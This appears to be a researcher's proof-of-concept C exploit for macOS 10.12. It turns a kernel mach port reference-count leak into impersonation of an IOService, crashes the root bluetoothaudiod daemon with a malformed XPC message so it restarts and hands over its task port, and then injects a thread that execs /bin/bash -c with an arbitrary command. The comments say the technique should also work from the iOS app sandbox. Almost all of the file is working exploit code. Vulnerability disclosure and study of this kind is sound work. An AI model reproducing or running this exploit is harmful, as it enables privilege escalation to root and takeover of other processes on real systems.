// ianbeer

#if 0
LPE exploit for the kernel ipc_port_t reference leak bug

I wanted to explore some more interesting exploit primitives I could build with this bug.

One idea I had was to turn a send right for a mach port into a receive right for that port.
We can do this by using the reference count leak to cause a port for which we have a send right
to be freed (leaving a dangling ipc_object pointer in our ports table and that of any other process
which had a send right) and forcing the memory to be reallocated with a new port for which we
hold a receive right.

We could for example target a userspace IPC service and replace a send right we've looked up via
launchd with a receive right allowing us to impersonate the service to other clients.

Another approach is to target the send rights we can get hold of for kernel-owned ports. In this case
whilst userspace does still communicate by sending messages the kernel doesn't actually enqueue those
messages; if a port is owned by the kernel then the send path is short-circuited and the MIG endpoint is
called directly. Those kernel-owned receive rights are however still ports and we can free them using
the bug; if we can then get that memory reused as a port for which we hold a receive right we can
end up impersonating the kernel to other processes!

Lots of kernel MIG apis take a task port as an argument; if we can manage to impersonate one of these
services we can get other processes to send us their task ports and thus gain complete control over them.

io_service_open_extended is a MIG api on an IOService port. Interestingly we can get a send right to any
IOService from any sandbox as there are no MAC checks to get an IOService, only to get one of its IOUserClients
(or query/manipulate the registry entries.) The io_service_open_extended message will be sent to the IOService
port and the message contains the sender's task port as the owningTask parameter :)

For this PoC expoit I've chosen to target IOBluetoothHCIController because we can control when this will be opened
by talking to the com.apple.bluetoothaudiod - more exactly when that daemon is started it will call IOServiceOpen.
We can force the daemon to restart by triggering a NULL pointer deref due to insufficient error checking when it
parses XPC messages. This doesn't require bluetooth to be enabled.

Putting this all together the flow of the exploit looks like this:

  * get a send right to the IOBluetoothHCIController IOService
  * overflow the reference count of that ipc_port to 0 and free it
  * allocate many new receive rights to reuse the freed ipc_port
  * add the new receive rights to a port set to simplify receiving messages
  * crash bluetoothaudiod forcing it to restart
  * bluetoothaudiod will get a send right to what it thinks is the IOBluetoothHCIController IOService
  * bluetoothaudiod will send its task port to the IOService
  * the task port is actually sent to us as we have the receive right
  * we use the task port to inject a new thread into bluetoothsudiod which execs /bin/bash -c COMMAND

Tested on MacOS 10.12 16a323

The technique should work exactly the same on iOS to get a task port for another process from the app sandbox.
#endif

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <mach/mach.h>
#include <mach/mach_vm.h>

#include <xpc/xpc.h>

#include <IOKit/IOKitLib.h>

void run_command(mach_port_t target_task, char* command) {
  kern_return_t err;

  // allocate some memory in the task
  mach_vm_address_t command_addr = 0;
  err = mach_vm_allocate(target_task,
                         &command_addr,
                         0x1000,
                         VM_FLAGS_ANYWHERE);

  if (err != KERN_SUCCESS) {
    printf("mach_vm_allocate: %s\n", mach_error_string(err));
    return;
  }

  printf("allocated command at %zx\n", command_addr);
  uint64_t bin_bash = command_addr;
  uint64_t dash_c = command_addr + 0x10;
  uint64_t cmd = command_addr + 0x20;
  uint64_t argv = command_addr + 0x800;

  uint64_t argv_contents[] = {bin_bash, dash_c, cmd, 0};

  err = mach_vm_write(target_task,
                      bin_bash,
                      "/bin/bash",
                      strlen("/bin/bash") + 1);
 
  err = mach_vm_write(target_task,
                      dash_c,
                      "-c",
                      strlen("-c") + 1);

  err = mach_vm_write(target_task,
                      cmd,
                      command,
                      strlen(command) + 1);

  err = mach_vm_write(target_task,
                      argv,
                      argv_contents,
                      sizeof(argv_contents));
 
  if (err != KERN_SUCCESS) {
    printf("mach_vm_write: %s\n", mach_error_string(err));
    return;
  }

  // create a new thread:
  mach_port_t new_thread = MACH_PORT_NULL;
  x86_thread_state64_t state;
  mach_msg_type_number_t stateCount = x86_THREAD_STATE64_COUNT;

  memset(&state, 0, sizeof(state));

  // the minimal register state we require:
  state.__rip = (uint64_t)execve;
  state.__rdi = (uint64_t)bin_bash;
  state.__rsi = (uint64_t)argv;
  state.__rdx = (uint64_t)0;

  err = thread_create_running(target_task,
                              x86_THREAD_STATE64,
                              (thread_state_t)&state,
                              stateCount,
                              &new_thread);

  if (err != KERN_SUCCESS) {
    printf("thread_create_running: %s\n", mach_error_string(err));
    return;
  }

  printf("done?\n");
}

void force_bluetoothaudiod_restart() {
  xpc_connection_t conn = xpc_connection_create_mach_service("com.apple.bluetoothaudiod", NULL, XPC_CONNECTION_MACH_SERVICE_PRIVILEGED);

  xpc_connection_set_event_handler(conn, ^(xpc_object_t event) {
    xpc_type_t t = xpc_get_type(event);
    if (t == XPC_TYPE_ERROR){
      printf("err: %s\n", xpc_dictionary_get_string(event, XPC_ERROR_KEY_DESCRIPTION));
    }
    printf("received an event\n");
  });
  xpc_connection_resume(conn);

  xpc_object_t msg = xpc_dictionary_create(NULL, NULL, 0);

  xpc_dictionary_set_string(msg, "BTMethod", "BTCoreAudioPassthrough");

  xpc_connection_send_message(conn, msg);

  printf("waiting to make sure launchd knows the target has crashed\n");
  usleep(100000);

  printf("bluetoothaudiod should have crashed now\n");

  xpc_release(msg);

	// connect to the service again and send a message to force it to restart:
  conn = xpc_connection_create_mach_service("com.apple.bluetoothaudiod", NULL, XPC_CONNECTION_MACH_SERVICE_PRIVILEGED);
  xpc_connection_set_event_handler(conn, ^(xpc_object_t event) {
    xpc_type_t t = xpc_get_type(event);
    if (t == XPC_TYPE_ERROR){
      printf("err: %s\n", xpc_dictionary_get_string(event, XPC_ERROR_KEY_DESCRIPTION));
    }
    printf("received an event\n");
  });
  xpc_connection_resume(conn);

  msg = xpc_dictionary_create(NULL, NULL, 0);

  xpc_dictionary_set_string(msg, "hello", "world");

  xpc_connection_send_message(conn, msg);

	printf("bluetoothaudiod should be calling IOServiceOpen now\n");
}

mach_port_t self;

void leak_one_ref(mach_port_t overflower) {
  kern_return_t err = _kernelrpc_mach_port_insert_right_trap(
    self,
    MACH_PORT_NULL, // an invalid name
    overflower,
    MACH_MSG_TYPE_COPY_SEND);  
}

void leak_one_ref_for_receive(mach_port_t overflower) {
  kern_return_t err = _kernelrpc_mach_port_insert_right_trap(
    self,
    MACH_PORT_NULL, // an invalid name
    overflower,
    MACH_MSG_TYPE_MAKE_SEND); // if you have a receive right
}

char* spinners = "-\\|/";
void leak_n_refs(mach_port_t overflower, uint64_t n_refs) {
	int step = 0;
  for (uint64_t i = 0; i < n_refs; i++) {
    leak_one_ref(overflower);
    if ((i % 0x40000) == 0) {
      float done = (float)i/(float)n_refs;
		 	step = (step+1) % strlen(spinners);
      fprintf(stdout, "\roverflowing [%c] (%3.3f%%)", spinners[step], done * 100);
      fflush(stdout);
    }
  }
	fprintf(stdout, "\roverflowed                           \n");
	fflush(stdout);
}

// quickly take a release a kernel reference
// if the reference has been overflowed to 0 this will free the object
void inc_and_dec_ref(mach_port_t p) {
  // if we pass something which isn't a task port name:
  // port_name_to_task 
  //   ipc_object_copyin
  //     takes a ref
  //   ipc_port_release_send
  //     drops a ref

  _kernelrpc_mach_port_insert_right_trap(p, 0, 0, 0);
}

/* try to get the free'd port replaced with a new port for which we have
 * a receive right
 * Once we've allocated a lot of new ports add them all to a port set so
 * we can just receive on the port set to find the correct one
 */
mach_port_t replace_with_receive() {
  int n_ports = 2000;
  mach_port_t ports[n_ports];
  for (int i = 0; i < n_ports; i++) {
    mach_port_allocate(self, MACH_PORT_RIGHT_RECEIVE, &ports[i]);
  }

  // allocate a port set
  mach_port_t ps;
  mach_port_allocate(self, MACH_PORT_RIGHT_PORT_SET, &ps);
  for (int i = 0; i < n_ports; i++) {
    mach_port_move_member( self, ports[i], ps);
  }
  return ps;
}

/* listen on the port set for io_service_open_extended messages :
 */
struct service_open_mig {
	mach_msg_header_t Head;
	/* start of the kernel processed data */
	mach_msg_body_t msgh_body;
	mach_msg_port_descriptor_t owningTask;
	mach_msg_ool_descriptor_t properties;
	/* end of the kernel processed data */
	NDR_record_t NDR;
	uint32_t connect_type;
	NDR_record_t ndr;
	mach_msg_type_number_t propertiesCnt;
};

void service_requests(mach_port_t ps) {
  size_t size = 0x1000;
  struct service_open_mig* request = malloc(size);
  memset(request, 0, size);

  printf("receiving on port set\n");
  kern_return_t err = mach_msg(&request->Head,
                               MACH_RCV_MSG,
                               0,
                               size,
                               ps,
                               0,
                               0);

  if (err != KERN_SUCCESS) {
    printf("error receiving on port set: %s\n", mach_error_string(err));
    return;
  }

  mach_port_t replaced_with = request->Head.msgh_local_port;

  printf("got a message on the port set from port: local(0x%x) remote(0x%x)\n", request->Head.msgh_local_port, request->Head.msgh_remote_port); 	
	mach_port_t target_task = request->owningTask.name;
	printf("got task port: 0x%x\n", target_task);

	run_command(target_task, "touch /tmp/hello_from_fake_kernel");
  
  printf("did that work?\n");
	printf("leaking some refs so we don't kernel panic");

	for(int i = 0; i < 0x100; i++) {
		leak_one_ref_for_receive(replaced_with);
  }

}

int main() {
	self = mach_task_self(); // avoid making the trap every time

	//mach_port_t test;
  //mach_port_allocate(self, MACH_PORT_RIGHT_RECEIVE, &test);

  // get the service we want to target:
  mach_port_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOBluetoothHCIController"));
  printf("%d : 0x%x\n", getpid(), service);

  // we don't know how many refs the port actually has - lets guess less than 40...
  uint32_t max_refs = 40;
  leak_n_refs(service, 0x100000000-max_refs);

  // the port now has a reference count just below 0 so we'll try in a loop
  // to free it, reallocate and test to see if it worked - if not we'll hope
  // that was because we didn't free it:

  mach_port_t fake_service_port = MACH_PORT_NULL;
  for (uint32_t i = 0; i < max_refs; i++) {
    inc_and_dec_ref(service);

    mach_port_t replacer_ps = replace_with_receive();

    // send a message to the service - if we receive it on the portset then we won:
    mach_msg_header_t msg = {0};
    msg.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
    msg.msgh_remote_port = service;
    msg.msgh_id = 0x41414141;
    msg.msgh_size = sizeof(msg);
    kern_return_t err;
    err = mach_msg(&msg,
                   MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
                   (mach_msg_size_t)sizeof(msg),
                   0,
                   MACH_PORT_NULL,
                   MACH_MSG_TIMEOUT_NONE,
                   MACH_PORT_NULL);
    printf("sending probe: %s\n", mach_error_string(err));

    mach_msg_empty_rcv_t reply = {0};
    mach_msg(&reply.header,
             MACH_RCV_MSG | MACH_RCV_TIMEOUT,
             0,
             sizeof(reply),
             replacer_ps,
             1, // 1ms
             0);
             
		if (reply.header.msgh_id == 0x41414141) {
      // worked:
      printf("got the probe message\n");
      fake_service_port = replacer_ps;
      break;
    }
    printf("trying again (%d)\n", i);

    // if it didn't work leak another ref and try again:
    leak_one_ref(service);
  }


  printf("worked? - forcing a root process to restart, hopefully will send us its task port!\n");

	force_bluetoothaudiod_restart();

  service_requests(fake_service_port);

  return 0;
}